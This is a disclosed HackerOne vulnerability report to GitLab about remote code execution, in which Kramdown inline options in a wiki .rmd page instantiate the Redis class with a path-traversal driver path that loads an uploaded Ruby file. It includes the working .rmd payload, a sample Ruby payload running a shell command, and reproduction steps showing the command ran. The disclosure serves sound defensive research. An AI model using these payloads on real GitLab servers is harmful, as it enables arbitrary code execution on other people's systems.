# RCE via unsafe inline Kramdown options when rendering certain Wiki pages

## Report Details
- **Report ID**: 1125425
- **URL**: https://hackerone.com/reports/1125425
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2021-03-14T13:38:23.678Z
- **Disclosed**: 2021-04-20T17:35:23.805Z

## Reporter
- **Username**: vakzz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary

When rendering wiki content with certain extensions such as `.rmd`,  `render_wiki_content` will call [`other_markup_unsafe`](https://gitlab.com/gitlab-org/gitlab/-/blob/v13.9.3-ee/app/helpers/markup_helper.rb#L145) which will end up calling `GitHub::Markup.render` from the `github-markup` gem.  Files with any extension can be uploaded by checking out the wiki with git, commiting the files and pushing the changes back.

Since `kramdown` is loaded, this will end up using it for the [markdown parser](https://github.com/github/markup/blob/v1.7.0/lib/github/markup/markdown.rb#L23) by calling `Kramdown::Document.new(content).to_html`

Kramdown has a special extension that allows for options to be [set inline](https://kramdown.gettalong.org/options.html), the example they give is: `{::options auto_ids="false" footnote_nr="5" syntax_highlighter_opts="{line_numbers: true\}" /}`

The default syntax highlighter is `rouge` which has an option [`formatter`](https://kramdown.gettalong.org/syntax_highlighter/rouge.html) that can be set via `syntax_highlighter_opts` in the inline options. This option gets used by [`formatter_class`](https://github.com/gettalong/kramdown/blob/REL_2_3_0/lib/kramdown/converter/syntax_highlighter/rouge.rb#L73):

```ruby
  def self.call(converter, text, lang, type, call_opts)
      opts = options(converter, type)
      call_opts[:default_lang] = opts[:default_lang]
      return nil unless lang || opts[:default_lang] || opts[:guess_lang]

      lexer = ::Rouge::Lexer.find_fancy(lang || opts[:default_lang], text)
      return nil if opts[:disable] || !lexer || (lexer.tag == "plaintext" && !opts[:guess_lang])

      opts[:css_class] ||= 'highlight' # For backward compatibility when using Rouge 2.0
      formatter = formatter_class(opts).new(opts)
      formatter.format(lexer.lex(text))
    end

  def self.formatter_class(opts = {})
      puts "formatter"
      puts opts[:formatter]
      case formatter = opts[:formatter]
      when Class
        formatter
      when /\A[[:upper:]][[:alnum:]_]*\z/
        ::Rouge::Formatters.const_get(formatter)
      else
        # Available in Rouge 2.0 or later
        ::Rouge::Formatters::HTMLLegacy
      end
    rescue NameError
      # Fallback to Rouge 1.x
      ::Rouge::Formatters::HTML
    end
```

So this a means that `::Rouge::Formatters.const_get(opts[:formatter]).new(opts)` will be called, where `opts` is controllable via the inline options to kramdown, allowing ruby objects to be initialised  so long as the validation of `/\A[[:upper:]][[:alnum:]_]*\z/` passes. The validation slightly restricts things, but pretty much any class without a namespace (`::` is not allowed) can be created. For example (the two `~~` should have an extra `~` but it's messing up the h1 formatting so will need to add it):

```markdown
{::options auto_ids="false" footnote_nr="5" syntax_highlighter="rouge" syntax_highlighter_opts="{formatter: CSV, line_numbers: true\}" /}

~~ ruby
    def what?
      42
    end
~~
```

Will result in a `CSV` object being created and then it will error with `private method 'format' called for #<CSV:0x00007fe4df7e26d0>` as it tries to use this as the formatter.

One of the loaded classes is gitlab is `Redis` from [redis-rb](https://github.com/redis/redis-rb) which has an option `driver` that is used to load the driver class:

https://github.com/redis/redis-rb/blob/v4.1.3/lib/redis/client.rb#L507
```ruby
    def _parse_driver(driver)
      driver = driver.to_s if driver.is_a?(Symbol)

      if driver.kind_of?(String)
        begin
          require_relative "connection/#{driver}"
        rescue LoadError, NameError => e
          begin
            require "connection/#{driver}"
          rescue LoadError, NameError => e
            raise RuntimeError, "Cannot load driver #{driver.inspect}: #{e.message}"
          end
        end

        driver = Connection.const_get(driver.capitalize)
      end

      driver
    end
```

As both `require_relative` and `require` allow for directory traversal, supplying a `driver` option such as `../../../../../../../../../../tmp/a.rb` will cause that file to be evaluated.

One of the ways to get a file to a known location in gitlab is to attach a file in the description of a snippet. When attaching, a markdown link will be created similar to: `[file.rb](/uploads/-/system/user/1/1cd3e965551892a4c0c1af01ef2f2ad7/file.rb)`. The default `gitlab_rails['uploads_directory']` is `/var/opt/gitlab/gitlab-rails/uploads` meaning the final file location will be `/var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/1cd3e965551892a4c0c1af01ef2f2ad7/file.rb`.

Combining all of of this, we can create the following `.rmd` file to execute our payload (add `~` to both of the `~~`):
```
{::options auto_ids="false" footnote_nr="5" syntax_highlighter="rouge" syntax_highlighter_opts="{formatter: Redis, driver: ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/1cd3e965551892a4c0c1af01ef2f2ad7/file.rb\}" /}

~~ ruby
def what?
  42
end
~~
```

### Steps to reproduce

1. Create a new snippet with any title and file
1. In the description, click `Attach a file` and select the final ruby payload such as:
    ```ruby
puts "hello from ruby"
`echo vakzz was here > /tmp/vakzz`
    ```
1. Make note of the upload path: `/uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb`
1. Create a new project
1. Click Wiki and create a default home page
1. Hit `Clone repository` to get the clone command
1. Clone the repo `git clone git@gitlab-docker.local:root/proj1.wiki.git` and add the following file `page1.rmd` using the path from above (add `~` to both the the `~~`): 

    ```
{::options syntax_highlighter="rouge" syntax_highlighter_opts="{formatter: Redis, driver: ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb\}" /}
~~ ruby
def what?
  42
end
~~
    ```

1. Push the changes `git add -A . && git commit -m "page1.rmd" && git push`
1. Refresh the wiki, there should now be `page1 ` of the right hand side
1. Click and load `page1`
1. In the gitlab logs you should see something like:

    ```
wrong constant name ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb
lib/gitlab/other_markup.rb:11:in `render'
app/helpers/markup_helper.rb:280:in `other_markup_unsafe'
app/helpers/markup_helper.rb:145:in `markup_unsafe'
app/helpers/markup_helper.rb:130:in `render_wiki_content'
app/views/shared/wikis/show.html.haml:30
    ```

1. Looking at `/tmp` you can see that the payload was executed:

    ```bash
root@gitlab-docker:~# cat /tmp/vakzz
vakzz was here
    ```

### Impact
Allows any user with push access to a wiki to execute arbitrary ruby code.

### Examples
Example page using the inline options to change the highlighter from rouge to `minted` - https://gitlab.com/vakzz-h1/kramdown-wiki/-/wikis/page1

### What is the current *bug* behavior?
Inline options can be set when rendering kramdown documents

### What is the expected *correct* behavior?
`forbidden_inline_options` could be use to disable the dangerous inline options - https://kramdown.gettalong.org/options.html

### Output of checks

#### Results of GitLab environment info

```
System information
System:
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.7.2p137
Gem Version:	3.1.4
Bundler Version:2.1.4
Rake Version:	13.0.3
Redis Version:	6.0.10
Git Version:	2.29.0
Sidekiq Version:5.2.9
Go Version:	unknown

GitLab information
Version:	13.9.1-ee
Revision:	8ae438629fa
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	12.5
URL:		http://gitlab-docker.local
HTTP Clone URL:	http://gitlab-docker.local/some-group/some-project.git
SSH Clone URL:	git@gitlab-docker.local:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	13.16.1
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

Allows any user with push access to a wiki to execute arbitrary ruby code.

## Attachments
No attachments
